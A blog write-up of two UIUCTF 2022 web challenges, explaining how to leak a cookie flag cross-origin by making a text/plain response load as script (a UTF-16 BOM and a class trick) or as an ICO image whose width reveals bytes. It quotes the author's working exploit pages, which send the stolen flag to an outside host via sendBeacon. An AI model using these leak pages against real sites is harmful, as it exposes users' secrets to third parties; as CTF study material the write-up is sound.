---
title: UIUCTF 2022 Notes
catalog: true
date: 2022-08-01 20:31:10
tags: [Security]
categories: [Security]
photos: /img/uiuctf-ctf-2022-writeup/cover-en.png
---

I didn't participate in this CTF, but I found two interesting problems related to content type and I want to write down the solutions.

<!-- more -->

## modernism(21 solves)

The code is super simple:

``` py
from flask import Flask, Response, request
app = Flask(__name__)

@app.route('/')
def index():
    prefix = bytes.fromhex(request.args.get("p", default="", type=str))
    flag = request.cookies.get("FLAG", default="uiuctf{FAKEFLAG}").encode() #^uiuctf{[A-Za-z]+}$
    return Response(prefix+flag, mimetype="text/plain")
```

It will hex decode the data you send and add it to the flag in the response. An admin bot will visit your page with the flag in the cookie.

I originally thought that `text/plain` cannot be loaded as a script, even if `X-Content-Type-Options: nosniff` is not added. Later, I found out that I remembered it wrong, and it is actually possible.

The relevant code is in [third_party/blink/renderer/platform/loader/allowed_by_nosniff.cc](https://source.chromium.org/chromium/chromium/src/+/refs/tags/106.0.5211.0:third_party/blink/renderer/platform/loader/allowed_by_nosniff.cc;l=79;bpv=0;bpt=1)

``` c
// Helper function to decide what to do with with a given mime type. This takes
// - a mime type
// - inputs that affect the decision (is_same_origin, mime_type_check_mode).
//
// The return value determines whether this mime should be allowed or blocked.
// Additionally, warn returns whether we should log a console warning about
// expected future blocking of this resource. 'counter' determines which
// Use counter should be used to count this. 'is_worker_global_scope' is used
// for choosing 'counter' value.
bool AllowMimeTypeAsScript(const String& mime_type,
                           bool same_origin,
                           AllowedByNosniff::MimeTypeCheck mime_type_check_mode,
                           WebFeature& counter) {
  using MimeTypeCheck = AllowedByNosniff::MimeTypeCheck;

  // If strict mime type checking for workers is enabled, we'll treat all
  // "lax" for worker cases as strict.
  if (mime_type_check_mode == MimeTypeCheck::kLaxForWorker &&
      RuntimeEnabledFeatures::StrictMimeTypesForWorkersEnabled()) {
    mime_type_check_mode = MimeTypeCheck::kStrict;
  }

  // The common case: A proper JavaScript MIME type
  if (MIMETypeRegistry::IsSupportedJavaScriptMIMEType(mime_type))
    return true;

  // Check for certain non-executable MIME types.
  // See:
  // https://fetch.spec.whatwg.org/#should-response-to-request-be-blocked-due-to-mime-type?
  if (mime_type.StartsWithIgnoringASCIICase("image/")) {
    counter = WebFeature::kBlockedSniffingImageToScript;
    return false;
  }
  if (mime_type.StartsWithIgnoringASCIICase("audio/")) {
    counter = WebFeature::kBlockedSniffingAudioToScript;
    return false;
  }
  if (mime_type.StartsWithIgnoringASCIICase("video/")) {
    counter = WebFeature::kBlockedSniffingVideoToScript;
    return false;
  }
  if (mime_type.StartsWithIgnoringASCIICase("text/csv")) {
    counter = WebFeature::kBlockedSniffingCSVToScript;
    return false;
  }

  if (mime_type_check_mode == MimeTypeCheck::kStrict) {
    return false;
  }
  DCHECK(mime_type_check_mode == MimeTypeCheck::kLaxForWorker ||
         mime_type_check_mode == MimeTypeCheck::kLaxForElement);

  // Beyond this point we handle legacy MIME types, where it depends whether
  // we still wish to accept them (or log them using UseCounter, or add a
  // deprecation warning to the console).

  if (EqualIgnoringASCIICase(mime_type, "text/javascript1.6") ||
      EqualIgnoringASCIICase(mime_type, "text/javascript1.7")) {
    // We've been excluding these legacy values from UseCounter stats since
    // before.
    return true;
  }

  if (mime_type.StartsWithIgnoringASCIICase("application/octet-stream")) {
    counter = kApplicationOctetStreamFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringASCIICase("application/xml")) {
    counter = kApplicationXmlFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringASCIICase("text/html")) {
    counter = kTextHtmlFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringASCIICase("text/plain")) {
    counter = kTextPlainFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringCase("text/xml")) {
    counter = kTextXmlFeatures[same_origin];
  } else if (mime_type.StartsWithIgnoringCase("text/json") ||
             mime_type.StartsWithIgnoringCase("application/json")) {
    counter = kJsonFeatures[same_origin];
  } else {
    counter = kUnknownFeatures[same_origin];
  }

  return true;
}
```

However, even if it can be loaded as a script, it is not easy to make it executable because the flag contains `{}`.

The unexpected solution is to use a class. Adding `class` in front of the flag makes it `class uiuctf{fakeflag}`, and with this, you can get the entire string that was declared when the class was declared by using `uiuctf+''`, and then you get the flag.

The expected solution is to add a BOM in front of the flag, so that JS interprets the entire script in UTF-16, and the original flag becomes strange Chinese characters, so it won't break. You can add `++window.` in front, and then look at each property of the window.

The author's [solution](https://codesandbox.io/s/modernism-sol-05tjvc?file=/index.html:0-1544) is as follows:

``` html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Static Template</title>
  </head>
  <body>
    <!--
      we use a BOM (byte order mark) to change the encoding
      of the document and cause it to be interpreted as valid JS

      BOM = magic unicode character at start of document 
        to indicate encoding and endianness

      chrome supports the UTF16-BE and UTF16-LE BOMs:
      FE FF and FF FE

      we then encode: ++window. as UTF16-BE
      2B2B7769006E0064006F0077002E

      so the JS executed is:
      ++window.RANDOM_UNICODE_CHARACTERS
      
      - luckily, when decoding the flag format as UTF-16 BE, 
        the resultant characters will always be a valid JS identifier
        - this is NOT true in precisionism, due to the space and ! characters in the suffix

      Finally, we iterate through the `window` object,
      and utf16-be encode the added property to get the flag
    -->
    <script src="https://modernism-web.chal.uiuc.tf/?p=FEFF002B002B00770069006E0064006F0077002E"></script>
    <script>
      const encutf16=(s)=>[...s].flatMap(c=>[String.fromCharCode(c.charCodeAt(0)>>8),String.fromCharCode(c.charCodeAt(0)&0xff)]).join('');
      const flag = Object.getOwnPropertyNames(window).map(x=>encutf16(x)).find(x=>x.startsWith('uiuctf{'));
      navigator.sendBeacon("//hc.lc/log2.php?modernism",flag);
    </script>
  </body>
</html>
```


## precisionism(3 solves)

This problem is similar to the previous one, but with some additional content at the end:

``` py
from flask import Flask, Response, request
app = Flask(__name__)

@app.route('/')
def index():
    prefix = bytes.fromhex(request.args.get("p", default="", type=str))
    flag = request.cookies.get("FLAG", default="uiuctf{FAKEFLAG}").encode() #^uiuctf{[0-9A-Za-z]{8}}$
    return Response(prefix+flag+b"Enjoy your flag!", mimetype="text/plain")
```

Because of the additional content, the previous two methods cannot be used.

The expected solution for this problem is to make the response an ICO format, and then put the part to be leaked into the width, so that you can get the width of the image cross-origin, and get one byte at a time:

The author's [solution](https://codesandbox.io/s/precisionism-sol-17tev5?file=/index.html:0-1039) is as follows:

``` html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Static Template</title>
  </head>
  <body>
    <h1>
      This is a static template, there is no bundler or bundling involved!
    </h1>
    <script>
      const sleep = () => new Promise((res) => setTimeout(res, 50));
      async function exfil(i) {
        let img = new Image();
        let p = "00000100020001010000010020006804000026000000";
        if (i>0) p = p.slice(0, -i*2);
        img.src = `https://precisionism-web.chal.uiuc.tf/?p=${p}`;
        await img.decode();
        return img.width;
      }
      async function main() {
        for (let i = 0; i < 16; i++) {
          let c = await exfil(i);
          console.log(String.fromCharCode(c));
          navigator.sendBeacon("//hc.lc/log2.php?precisionism",String.fromCharCode(c)+" "+c)
        }
      }
      main();
    </script>
  </body>
</html>
```

## Summary

I also studied how Chromium does mime sniffing, but it seems to have little to do with this problem, so I will note the location: https://source.chromium.org/chromium/chromium/src/+/master:net/base/mime_sniffer.cc
